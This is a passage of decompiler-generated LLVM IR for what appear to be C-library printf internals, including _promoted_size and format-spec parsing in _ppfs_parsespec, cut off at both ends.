  uselistorder label %dec_label_pc_804e831, { 1, 0 }
  uselistorder label %dec_label_pc_804e82e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e824, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e7bf, { 1, 0 }
  uselistorder label %dec_label_pc_804e7bb, { 1, 0 }
  uselistorder label %dec_label_pc_804e7a1, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e888 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e88f

dec_label_pc_804e88f:                             ; preds = %dec_label_pc_804e88f, %entry
  %v0_804e88f = phi i32 [ ptrtoint (i8** @global_var_8050c52.117 to i32), %entry ], [ %v1_804e88f, %dec_label_pc_804e88f ]
  %v1_804e88f = add i32 %v0_804e88f, -2
  %v1_804e892 = inttoptr i32 %v1_804e88f to i16*
  %v2_804e892 = load i16, i16* %v1_804e892, align 2
  %v3_804e892 = sext i16 %v2_804e892 to i32
  %v12_804e895 = icmp ne i32 %v3_804e892, %v0_804e888
  %v6_804e89f = icmp ugt i32 %v1_804e88f, ptrtoint (i32* @global_var_8050c3a.118 to i32)
  %or.cond = and i1 %v6_804e89f, %v12_804e895
  br i1 %or.cond, label %dec_label_pc_804e88f, label %dec_label_pc_804e8a1

dec_label_pc_804e8a1:                             ; preds = %dec_label_pc_804e88f
  %.pre = add i32 %v0_804e88f, -134548540
  %v2_804e8a7 = sdiv i32 %.pre, 2
  store i32 %v2_804e8a7, i32* @edx, align 4
  %v1_804e8a9 = add i32 %v2_804e8a7, ptrtoint (i8** @global_var_8050c52.117 to i32)
  %v2_804e8a9 = inttoptr i32 %v1_804e8a9 to i8*
  %v3_804e8a9 = load i8, i8* %v2_804e8a9, align 1
  %v4_804e8a9 = zext i8 %v3_804e8a9 to i32
  ret i32 %v4_804e8a9

; uselistorder directives
  uselistorder i32 %v2_804e8a7, { 1, 0 }
  uselistorder i32 %v1_804e88f, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8050c52.117 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e8b2 = load i32, i32* @edi, align 4
  %v0_804e8b3 = load i32, i32* @esi, align 4
  %v0_804e8b4 = load i32, i32* @ebx, align 4
  store i32 %v0_804e8b4, i32* %stack_var_-16, align 4
  %v4_804e8b4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804e8e0 = add i32 %tmp76, 24
  %v2_804e8e0 = inttoptr i32 %v1_804e8e0 to i32*
  %v3_804e8e0 = load i32, i32* %v2_804e8e0, align 4
  store i32 %v3_804e8e0, i32* %eax.global-to-local, align 4
  %v1_804e8e7 = add i32 %tmp76, 16
  %v2_804e8e7 = inttoptr i32 %v1_804e8e7 to i32*
  %v3_804e8e7 = load i32, i32* %v2_804e8e7, align 4
  %v1_804e8ea = and i32 %v3_804e8e7, 128
  %v2_804e8ea = icmp eq i32 %v1_804e8ea, 0
  store i32 %v1_804e8ea, i32* %edi.global-to-local, align 4
  %v1_804e8f0 = icmp eq i1 %v2_804e8ea, false
  br i1 %v1_804e8f0, label %dec_label_pc_804e903, label %dec_label_pc_804e8f2

dec_label_pc_804e8f2:                             ; preds = %entry
  %v2_804e8f2 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804e950.outer

dec_label_pc_804e8fd:                             ; preds = %dec_label_pc_804ea8b
  %v1_804e8fd = add i32 %v0_804ea8b.pre.pre, 1
  store i32 %v1_804e8fd, i32* @esi, align 4
  br label %dec_label_pc_804ea9b

dec_label_pc_804e903:                             ; preds = %entry
  %v15_804e8b5 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e905

dec_label_pc_804e905:                             ; preds = %dec_label_pc_804e92d.dec_label_pc_804e905_crit_edge, %dec_label_pc_804e903
  %v2_804e916 = phi i32 [ %v2_804e916.pre, %dec_label_pc_804e92d.dec_label_pc_804e905_crit_edge ], [ %v15_804e8b5, %dec_label_pc_804e903 ]
  %v3_804e916 = phi i32 [ %v1_804e92d, %dec_label_pc_804e92d.dec_label_pc_804e905_crit_edge ], [ 0, %dec_label_pc_804e903 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804e909 = mul i32 %v3_804e916, 4
  store i32 %v1_804e909, i32* @ecx, align 4
  %v2_804e910 = load i32, i32* %arg1, align 4
  store i32 %v2_804e910, i32* @edx, align 4
  %v2_804e912 = add i32 %v1_804e909, -4
  %v3_804e912 = add i32 %v2_804e912, %v2_804e910
  %v4_804e912 = inttoptr i32 %v3_804e912 to i32*
  %v5_804e912 = load i32, i32* %v4_804e912, align 4
  store i32 %v5_804e912, i32* %eax.global-to-local, align 4
  %v1_804e916 = trunc i32 %v5_804e912 to i8
  %v4_804e916 = add i32 %v2_804e916, 36
  %v5_804e916 = add i32 %v4_804e916, %v3_804e916
  %v6_804e916 = inttoptr i32 %v5_804e916 to i8*
  store i8 %v1_804e916, i8* %v6_804e916, align 1
  %v0_804e91a = load i32, i32* %eax.global-to-local, align 4
  %v1_804e91a = urem i32 %v0_804e91a, 256
  %v2_804e91a = load i32, i32* @ebx, align 4
  %v3_804e91a = and i32 %v2_804e91a, -256
  %v4_804e91a = or i32 %v3_804e91a, %v1_804e91a
  store i32 %v4_804e91a, i32* @ebx, align 4
  %v1_804e91c = mul i32 %v0_804e91a, 16777216
  %v2_804e91c = sdiv i32 %v1_804e91c, 16777216
  store i32 %v2_804e91c, i32* %eax.global-to-local, align 4
  %v1_804e91f = load i32, i32* @edx, align 4
  %v2_804e91f = load i32, i32* @ecx, align 4
  %v3_804e91f = add i32 %v1_804e91f, -4
  %v4_804e91f = add i32 %v3_804e91f, %v2_804e91f
  %v5_804e91f = inttoptr i32 %v4_804e91f to i32*
  %v6_804e91f = load i32, i32* %v5_804e91f, align 4
  %v17_804e91f = icmp eq i32 %v2_804e91c, %v6_804e91f
  %v1_804e923 = icmp eq i1 %v17_804e91f, false
  br i1 %v1_804e923, label %dec_label_pc_804ec75, label %dec_label_pc_804e929

dec_label_pc_804e929:                             ; preds = %dec_label_pc_804e905
  %v3_804e929 = trunc i32 %v0_804e91a to i8
  %v4_804e929 = icmp eq i8 %v3_804e929, 0
  br i1 %v4_804e929, label %dec_label_pc_804e933, label %dec_label_pc_804e92d

dec_label_pc_804e92d:                             ; preds = %dec_label_pc_804e929
  %v0_804e92d = load i32, i32* %esi.global-to-local, align 4
  %v1_804e92d = add i32 %v0_804e92d, 1
  store i32 %v1_804e92d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e92d, 32
  br i1 %tmp, label %dec_label_pc_804e92d.dec_label_pc_804e905_crit_edge, label %dec_label_pc_804e933

dec_label_pc_804e92d.dec_label_pc_804e905_crit_edge: ; preds = %dec_label_pc_804e92d
  %v2_804e916.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e905

dec_label_pc_804e933:                             ; preds = %dec_label_pc_804e92d, %dec_label_pc_804e929
  %v2_804e938 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804e950.outer

dec_label_pc_804e950.outer:                       ; preds = %dec_label_pc_804e933, %dec_label_pc_804e8f2, %dec_label_pc_804ea6d
  %v0_804e95c.ph94 = phi i32 [ %v1_804ea6d, %dec_label_pc_804ea6d ], [ %v2_804e8f2, %dec_label_pc_804e8f2 ], [ %v2_804e938, %dec_label_pc_804e933 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804ea6d ], [ %tmp66, %dec_label_pc_804e8f2 ], [ %tmp66, %dec_label_pc_804e933 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804e8f6, %dec_label_pc_804ea6d ], [ 0, %dec_label_pc_804e8f2 ], [ 0, %dec_label_pc_804e933 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ea6d ], [ %v3_804e8e0, %dec_label_pc_804e8f2 ], [ %v3_804e8e0, %dec_label_pc_804e933 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804ea6d ], [ 0, %dec_label_pc_804e8f2 ], [ 0, %dec_label_pc_804e933 ]
  %v7_804e957 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804e957 = trunc i64 %v7_804e957 to i32
  %v2_804e95f = add i32 %v8_804e957, 80
  br label %dec_label_pc_804e950

dec_label_pc_804e950:                             ; preds = %dec_label_pc_804e950.outer, %dec_label_pc_804ea0d
  %v0_804e95c = phi i32 [ %v0_804ea1a, %dec_label_pc_804ea0d ], [ %v0_804e95c.ph94, %dec_label_pc_804e950.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804ea0d ], [ %stack_var_-32.1.ph, %dec_label_pc_804e950.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804ea0d ], [ %stack_var_-88.1.ph, %dec_label_pc_804e950.outer ]
  store i32 %v0_804e95c, i32* @edx, align 4
  %v1_804e950 = inttoptr i32 %v0_804e95c to i8*
  %v2_804e950 = load i8, i8* %v1_804e950, align 1
  %v11_804e950 = icmp eq i8 %v2_804e950, 42
  store i32 %v0_804e95c, i32* @esi, align 4
  %v1_804e955 = icmp eq i1 %v11_804e950, false
  br i1 %v1_804e955, label %dec_label_pc_804e967, label %dec_label_pc_804e957

dec_label_pc_804e957:                             ; preds = %dec_label_pc_804e950
  store i32 %v8_804e957, i32* %eax.global-to-local, align 4
  %v1_804e95c = add i32 %v0_804e95c, 1
  store i32 %v1_804e95c, i32* @esi, align 4
  %v0_804e95f = load i32, i32* @esp, align 4
  %v3_804e95f = add i32 %v2_804e95f, %v0_804e95f
  %v4_804e95f = inttoptr i32 %v3_804e95f to i32*
  store i32 0, i32* %v4_804e95f, align 4
  %v0_804e981.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e967

dec_label_pc_804e967:                             ; preds = %dec_label_pc_804e950, %dec_label_pc_804e957
  %v0_804e981.pre = phi i32 [ %v0_804e95c, %dec_label_pc_804e950 ], [ %v0_804e981.pre.pre, %dec_label_pc_804e957 ]
  %v0_804e967 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804e967, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804e981.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e981

dec_label_pc_804e971:                             ; preds = %dec_label_pc_804e981
  %v1_804e971 = add i32 %v1_804e979, -4094
  %v6_804e971 = sub i32 4093, %v1_804e979
  %v7_804e971 = and i32 %v6_804e971, %v1_804e979
  %v8_804e971 = icmp slt i32 %v7_804e971, 0
  %v9_804e971 = icmp eq i32 %v1_804e971, 0
  %v10_804e971 = icmp slt i32 %v1_804e971, 0
  %v3_804e977 = icmp eq i1 %v10_804e971, %v8_804e971
  %v4_804e977 = icmp eq i1 %v9_804e971, false
  %v5_804e977 = and i1 %v4_804e977, %v3_804e977
  br i1 %v5_804e977, label %dec_label_pc_804e980, label %dec_label_pc_804e979

dec_label_pc_804e979:                             ; preds = %dec_label_pc_804e971
  %v3_804e979 = mul i32 %v1_804e979, 10
  store i32 %v3_804e979, i32* %eax.global-to-local, align 4
  %v2_804e97c = add i32 %v3_804e979, -48
  %v3_804e97c = add i32 %v2_804e97c, %v2_804e983
  store i32 %v3_804e97c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e980

dec_label_pc_804e980:                             ; preds = %dec_label_pc_804e971, %dec_label_pc_804e979
  %v0_804e99b32 = phi i32 [ %v1_804e979, %dec_label_pc_804e971 ], [ %v3_804e97c, %dec_label_pc_804e979 ]
  %v4_804e98128 = phi i32 [ %v6_804e981, %dec_label_pc_804e971 ], [ %v3_804e979, %dec_label_pc_804e979 ]
  %v1_804e980 = add i32 %v0_804e980, 1
  store i32 %v1_804e980, i32* @esi, align 4
  br label %dec_label_pc_804e981

dec_label_pc_804e981:                             ; preds = %dec_label_pc_804e967, %dec_label_pc_804e980
  %v1_804e979 = phi i32 [ 0, %dec_label_pc_804e967 ], [ %v0_804e99b32, %dec_label_pc_804e980 ]
  %v4_804e981 = phi i32 [ %v4_804e981.pre, %dec_label_pc_804e967 ], [ %v4_804e98128, %dec_label_pc_804e980 ]
  %v0_804e980 = phi i32 [ %v0_804e981.pre, %dec_label_pc_804e967 ], [ %v1_804e980, %dec_label_pc_804e980 ]
  %v1_804e981 = inttoptr i32 %v0_804e980 to i8*
  %v2_804e981 = load i8, i8* %v1_804e981, align 1
  %v3_804e981 = zext i8 %v2_804e981 to i32
  %v5_804e981 = and i32 %v4_804e981, -256
  %v6_804e981 = or i32 %v3_804e981, %v5_804e981
  store i32 %v6_804e981, i32* %eax.global-to-local, align 4
  %v2_804e983 = sext i8 %v2_804e981 to i32
  store i32 %v2_804e983, i32* @ecx, align 4
  %v2_804e986 = mul nsw i32 %v2_804e983, 2
  %v3_804e986 = add i32 %v2_804e986, %v0_804e967
  %v4_804e986 = inttoptr i32 %v3_804e986 to i8*
  %v5_804e986 = load i8, i8* %v4_804e986, align 1
  %v6_804e986 = and i8 %v5_804e986, 8
  %v7_804e986 = icmp eq i8 %v6_804e986, 0
  %v1_804e98b = icmp eq i1 %v7_804e986, false
  br i1 %v1_804e98b, label %dec_label_pc_804e971, label %dec_label_pc_804e98d

dec_label_pc_804e98d:                             ; preds = %dec_label_pc_804e981
  %v0_804e98d = load i32, i32* @edx, align 4
  %v1_804e98d = add i32 %v0_804e98d, -1
  %v2_804e98d = inttoptr i32 %v1_804e98d to i8*
  %v3_804e98d = load i8, i8* %v2_804e98d, align 1
  %v12_804e98d = icmp eq i8 %v3_804e98d, 37
  %v1_804e991 = icmp eq i1 %v12_804e98d, false
  br i1 %v1_804e991, label %dec_label_pc_804ea24, label %dec_label_pc_804e997

dec_label_pc_804e997:                             ; preds = %dec_label_pc_804e98d
  %v10_804e997 = icmp eq i8 %v2_804e981, 36
  %v1_804e999 = icmp eq i1 %v10_804e997, false
  br i1 %v1_804e999, label %dec_label_pc_804e9cb, label %dec_label_pc_804e99b

dec_label_pc_804e99b:                             ; preds = %dec_label_pc_804e997
  %tmp89 = icmp slt i32 %v1_804e979, 1
  br i1 %tmp89, label %dec_label_pc_804e9cb, label %dec_label_pc_804e99f

dec_label_pc_804e99f:                             ; preds = %dec_label_pc_804e99b
  %v4_804e99f = icmp eq i32 %stack_var_-88.1, 0
  %v1_804e9a4 = add i32 %v0_804e980, 1
  store i32 %v1_804e9a4, i32* @edx, align 4
  br i1 %v4_804e99f, label %dec_label_pc_804ec75, label %dec_label_pc_804e9ad

dec_label_pc_804e9ad:                             ; preds = %dec_label_pc_804e99f
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804e9b5 = sub i32 %v1_804e979, %stack_var_-88.1
  %v8_804e9b5 = xor i32 %v1_804e979, %stack_var_-88.1
  %v9_804e9b5 = xor i32 %v2_804e9b5, %v1_804e979
  %v10_804e9b5 = and i32 %v9_804e9b5, %v8_804e9b5
  %v11_804e9b5 = icmp slt i32 %v10_804e9b5, 0
  %v12_804e9b5 = icmp eq i32 %v2_804e9b5, 0
  %v13_804e9b5 = icmp slt i32 %v2_804e9b5, 0
  %v3_804e9b7 = icmp ne i1 %v13_804e9b5, %v11_804e9b5
  %v4_804e9b7 = or i1 %v12_804e9b5, %v3_804e9b7
  %stack_var_-88.1.v0_804e9b9 = select i1 %v4_804e9b7, i32 %stack_var_-88.1, i32 %v1_804e979
  br label %dec_label_pc_804e9c7

dec_label_pc_804e9c7:                             ; preds = %dec_label_pc_804e9db, %dec_label_pc_804e9ad, %dec_label_pc_804e9df
  %v0_804e9c7 = phi i32 [ %v1_804e9a4, %dec_label_pc_804e9ad ], [ %v0_804e98d, %dec_label_pc_804e9df ], [ %v0_804e98d, %dec_label_pc_804e9db ]
  %stack_var_-32.2 = phi i32 [ %v1_804e979, %dec_label_pc_804e9ad ], [ %stack_var_-32.1, %dec_label_pc_804e9df ], [ %stack_var_-32.1, %dec_label_pc_804e9db ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804e9b9, %dec_label_pc_804e9ad ], [ 0, %dec_label_pc_804e9df ], [ 0, %dec_label_pc_804e9db ]
  store i32 %v0_804e9c7, i32* @esi, align 4
  br label %dec_label_pc_804e9ee

dec_label_pc_804e9cb:                             ; preds = %dec_label_pc_804e99b, %dec_label_pc_804e997
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804e9db, label %dec_label_pc_804e9d2

dec_label_pc_804e9d2:                             ; preds = %dec_label_pc_804e9cb
  %v10_804e9d2 = icmp eq i8 %v2_804e981, 109
  br i1 %v10_804e9d2, label %dec_label_pc_804ea24, label %dec_label_pc_804ec75

dec_label_pc_804e9db:                             ; preds = %dec_label_pc_804e9cb
  %tmp153 = icmp ugt i32 %v0_804e980, %v0_804e98d
  br i1 %tmp153, label %dec_label_pc_804e9df, label %dec_label_pc_804e9c7

dec_label_pc_804e9df:                             ; preds = %dec_label_pc_804e9db
  %v1_804e9df = inttoptr i32 %v0_804e98d to i8*
  %v2_804e9df = load i8, i8* %v1_804e9df, align 1
  %v8_804e9df = icmp eq i8 %v2_804e9df, 48
  br i1 %v8_804e9df, label %dec_label_pc_804e9c7, label %dec_label_pc_804ea24

dec_label_pc_804e9ee:                             ; preds = %dec_label_pc_804e9ff, %dec_label_pc_804e9c7
  %v0_804ea1a = phi i32 [ %v1_804e9ff, %dec_label_pc_804e9ff ], [ %v0_804e9c7, %dec_label_pc_804e9c7 ]
  %v4_804e9f835 = phi i32 [ %v6_804e9f8, %dec_label_pc_804e9ff ], [ %v6_804e981, %dec_label_pc_804e9c7 ]
  store i32 ptrtoint ([8 x i8]* @global_var_8050c32.119 to i32), i32* %edx.global-to-local, align 4
  %v1_804e9fb = inttoptr i32 %v0_804ea1a to i8*
  br label %dec_label_pc_804e9f8

dec_label_pc_804e9f8:                             ; preds = %dec_label_pc_804ea09, %dec_label_pc_804e9ee
  %v4_804e9f8 = phi i32 [ %v4_804e9f835, %dec_label_pc_804e9ee ], [ %v6_804e9f8, %dec_label_pc_804ea09 ]
  %v0_804e9fa = phi i32 [ ptrtoint ([8 x i8]* @global_var_8050c32.119 to i32), %dec_label_pc_804e9ee ], [ %v1_804e9fa, %dec_label_pc_804ea09 ]
  %v0_804ea09 = phi i32 [ 1, %dec_label_pc_804e9ee ], [ %v2_804ea09, %dec_label_pc_804ea09 ]
  store i32 %v0_804ea09, i32* @ecx, align 4
  %v1_804e9f8 = inttoptr i32 %v0_804e9fa to i8*
  %v2_804e9f8 = load i8, i8* %v1_804e9f8, align 1
  %v3_804e9f8 = zext i8 %v2_804e9f8 to i32
  %v5_804e9f8 = and i32 %v4_804e9f8, -256
  %v6_804e9f8 = or i32 %v3_804e9f8, %v5_804e9f8
  store i32 %v6_804e9f8, i32* %eax.global-to-local, align 4
  %v1_804e9fa = add i32 %v0_804e9fa, 1
  store i32 %v1_804e9fa, i32* @edx, align 4
  %v2_804e9fb = load i8, i8* %v1_804e9fb, align 1
  %v15_804e9fb = icmp eq i8 %v2_804e9fb, %v2_804e9f8
  %v1_804e9fd = icmp eq i1 %v15_804e9fb, false
  br i1 %v1_804e9fd, label %dec_label_pc_804ea04, label %dec_label_pc_804e9ff

dec_label_pc_804e9ff:                             ; preds = %dec_label_pc_804e9f8
  %v1_804e9ff = add i32 %v0_804ea1a, 1
  store i32 %v1_804e9ff, i32* @esi, align 4
  %v0_804ea00 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ea00 = or i32 %v0_804ea00, %v0_804ea09
  store i32 %v2_804ea00, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e9ee

dec_label_pc_804ea04:                             ; preds = %dec_label_pc_804e9f8
  %v1_804ea04 = inttoptr i32 %v1_804e9fa to i8*
  %v2_804ea04 = load i8, i8* %v1_804ea04, align 1
  %v3_804ea04 = icmp eq i8 %v2_804ea04, 0
  br i1 %v3_804ea04, label %dec_label_pc_804ea0d, label %dec_label_pc_804ea09

dec_label_pc_804ea09:                             ; preds = %dec_label_pc_804ea04
  %v2_804ea09 = mul i32 %v0_804ea09, 2
  br label %dec_label_pc_804e9f8

dec_label_pc_804ea0d:                             ; preds = %dec_label_pc_804ea04
  %v0_804ea0d = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804ea11 = udiv i32 %v0_804ea0d, 2
  %v1_804ea11.not = or i32 %v1_804ea11, -6
  %v1_804ea16 = xor i32 %v1_804ea11.not, 5
  store i32 %v1_804ea16, i32* %eax.global-to-local, align 4
  %v2_804ea18 = and i32 %v1_804ea16, %v0_804ea0d
  store i32 %v2_804ea18, i32* %edi.global-to-local, align 4
  %v1_804ea1a = add i32 %v0_804ea1a, -1
  %v2_804ea1a = inttoptr i32 %v1_804ea1a to i8*
  %v3_804ea1a = load i8, i8* %v2_804ea1a, align 1
  %v12_804ea1a = icmp eq i8 %v3_804ea1a, 37
  %v1_804ea1e = icmp eq i1 %v12_804ea1a, false
  br i1 %v1_804ea1e, label %dec_label_pc_804e950, label %dec_label_pc_804ea24

dec_label_pc_804ea24:                             ; preds = %dec_label_pc_804e9df, %dec_label_pc_804ea0d, %dec_label_pc_804e98d, %dec_label_pc_804e9d2
  %v0_804ea47 = phi i32 [ %v1_804e979, %dec_label_pc_804e9d2 ], [ %v1_804e979, %dec_label_pc_804e9df ], [ 0, %dec_label_pc_804ea0d ], [ %v1_804e979, %dec_label_pc_804e98d ]
  %v1_804ea50 = phi i32 [ %v0_804e980, %dec_label_pc_804e9d2 ], [ %v0_804e980, %dec_label_pc_804e9df ], [ %v0_804ea1a, %dec_label_pc_804ea0d ], [ %v0_804e980, %dec_label_pc_804e98d ]
  %v0_804ea4d = phi i32 [ %v0_804e98d, %dec_label_pc_804e9d2 ], [ %v0_804e98d, %dec_label_pc_804e9df ], [ %v1_804e9fa, %dec_label_pc_804ea0d ], [ %v0_804e98d, %dec_label_pc_804e98d ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804e9d2 ], [ %stack_var_-32.1, %dec_label_pc_804e9df ], [ %stack_var_-32.2, %dec_label_pc_804ea0d ], [ %stack_var_-32.1, %dec_label_pc_804e98d ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804e9d2 ], [ 0, %dec_label_pc_804e9df ], [ %stack_var_-88.2, %dec_label_pc_804ea0d ], [ %stack_var_-88.1, %dec_label_pc_804e98d ]
  %v1_804ea24 = inttoptr i32 %v0_804ea4d to i8*
  %v2_804ea24 = load i8, i8* %v1_804ea24, align 1
  %v11_804ea24 = icmp eq i8 %v2_804ea24, 42
  %v1_804ea27 = icmp eq i1 %v11_804ea24, false
  br i1 %v1_804ea27, label %dec_label_pc_804ea5d, label %dec_label_pc_804ea29

dec_label_pc_804ea29:                             ; preds = %dec_label_pc_804ea24
  %v4_804ea29 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804ea29, label %dec_label_pc_804ea4d, label %dec_label_pc_804ea30

dec_label_pc_804ea30:                             ; preds = %dec_label_pc_804ea29
  %v1_804ea30 = inttoptr i32 %v1_804ea50 to i8*
  %v2_804ea30 = load i8, i8* %v1_804ea30, align 1
  %v11_804ea30 = icmp eq i8 %v2_804ea30, 36
  %v1_804ea33 = icmp eq i1 %v11_804ea30, false
  br i1 %v1_804ea33, label %dec_label_pc_804ec75, label %dec_label_pc_804ea39

dec_label_pc_804ea39:                             ; preds = %dec_label_pc_804ea30
  %tmp91 = icmp slt i32 %v0_804ea47, 1
  br i1 %tmp91, label %dec_label_pc_804ec75, label %dec_label_pc_804ea41

dec_label_pc_804ea41:                             ; preds = %dec_label_pc_804ea39
  store i32 %v8_804e957, i32* %eax.global-to-local, align 4
  %v1_804ea46 = add i32 %v1_804ea50, 1
  store i32 %v1_804ea46, i32* @esi, align 4
  %v1_804ea47 = load i32, i32* @esp, align 4
  %v3_804ea47 = add i32 %v8_804e957, 68
  %v4_804ea47 = add i32 %v3_804ea47, %v1_804ea47
  %v5_804ea47 = inttoptr i32 %v4_804ea47 to i32*
  store i32 %v0_804ea47, i32* %v5_804ea47, align 4
  %v0_804ea8b.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea58

dec_label_pc_804ea4d:                             ; preds = %dec_label_pc_804ea29
  %v1_804ea4d = add i32 %v0_804ea4d, 1
  store i32 %v1_804ea4d, i32* %eax.global-to-local, align 4
  %v12_804ea50 = icmp eq i32 %v1_804ea4d, %v1_804ea50
  %v1_804ea52 = icmp eq i1 %v12_804ea50, false
  br i1 %v1_804ea52, label %dec_label_pc_804ec75, label %dec_label_pc_804ea58

dec_label_pc_804ea58:                             ; preds = %dec_label_pc_804ea4d, %dec_label_pc_804ea41
  %v0_804ea8b.pre.pre.pre = phi i32 [ %v1_804ea50, %dec_label_pc_804ea4d ], [ %v0_804ea8b.pre.pre.pre.pre, %dec_label_pc_804ea41 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ea5d

dec_label_pc_804ea5d:                             ; preds = %dec_label_pc_804ea24, %dec_label_pc_804ea58
  %v0_804ea8b.pre.pre = phi i32 [ %v1_804ea50, %dec_label_pc_804ea24 ], [ %v0_804ea8b.pre.pre.pre, %dec_label_pc_804ea58 ]
  %v0_804e8f6 = phi i32 [ %v0_804ea47, %dec_label_pc_804ea24 ], [ -2147483648, %dec_label_pc_804ea58 ]
  %v4_804ea5d = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804ea5d = icmp eq i32 %v4_804ea5d, 0
  %v1_804ea62 = icmp eq i1 %v5_804ea5d, false
  %.pre = inttoptr i32 %v0_804ea8b.pre.pre to i8*
  br i1 %v1_804ea62, label %dec_label_pc_804ea86, label %dec_label_pc_804ea68

dec_label_pc_804ea68:                             ; preds = %dec_label_pc_804ea5d
  %v2_804ea68 = load i8, i8* %.pre, align 1
  %v11_804ea68 = icmp eq i8 %v2_804ea68, 46
  %v1_804ea6b = icmp eq i1 %v11_804ea68, false
  br i1 %v1_804ea6b, label %dec_label_pc_804ea7f, label %dec_label_pc_804ea6d

dec_label_pc_804ea6d:                             ; preds = %dec_label_pc_804ea68
  %v1_804ea6d = add i32 %v0_804ea8b.pre.pre, 1
  store i32 %v1_804ea6d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e950.outer

dec_label_pc_804ea7f:                             ; preds = %dec_label_pc_804ea68
  br label %dec_label_pc_804ea86

dec_label_pc_804ea86:                             ; preds = %dec_label_pc_804ea5d, %dec_label_pc_804ea7f
  %stack_var_-96.2 = phi i32 [ %v0_804e8f6, %dec_label_pc_804ea7f ], [ %stack_var_-96.1.ph, %dec_label_pc_804ea5d ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804ea7f ], [ %v0_804e8f6, %dec_label_pc_804ea5d ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8050be0.120 to i32), i32* @edx, align 4
  %v4_804ea8b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea8b

dec_label_pc_804ea8b:                             ; preds = %dec_label_pc_804ea95, %dec_label_pc_804ea86
  %v0_804ea95 = phi i32 [ %v1_804ea95, %dec_label_pc_804ea95 ], [ ptrtoint ([9 x i8]* @global_var_8050be0.120 to i32), %dec_label_pc_804ea86 ]
  %v4_804ea8b = phi i32 [ %v6_804ea8b, %dec_label_pc_804ea95 ], [ %v4_804ea8b.pre, %dec_label_pc_804ea86 ]
  %v2_804ea8b = load i8, i8* %.pre, align 1
  %v3_804ea8b = zext i8 %v2_804ea8b to i32
  %v5_804ea8b = and i32 %v4_804ea8b, -256
  %v6_804ea8b = or i32 %v3_804ea8b, %v5_804ea8b
  store i32 %v6_804ea8b, i32* %eax.global-to-local, align 4
  %v3_804ea8d = inttoptr i32 %v0_804ea95 to i8*
  %v4_804ea8d = load i8, i8* %v3_804ea8d, align 1
  %v15_804ea8d = icmp eq i8 %v2_804ea8b, %v4_804ea8d
  br i1 %v15_804ea8d, label %dec_label_pc_804e8fd, label %dec_label_pc_804ea95

dec_label_pc_804ea95:                             ; preds = %dec_label_pc_804ea8b
  %v1_804ea95 = add i32 %v0_804ea95, 1
  store i32 %v1_804ea95, i32* @edx, align 4
  %v1_804ea96 = inttoptr i32 %v1_804ea95 to i8*
  %v2_804ea96 = load i8, i8* %v1_804ea96, align 1
  %v3_804ea96 = icmp eq i8 %v2_804ea96, 0
  %v1_804ea99 = icmp eq i1 %v3_804ea96, false
  br i1 %v1_804ea99, label %dec_label_pc_804ea8b, label %dec_label_pc_804ea9b

dec_label_pc_804ea9b:                             ; preds = %dec_label_pc_804ea95, %dec_label_pc_804e8fd
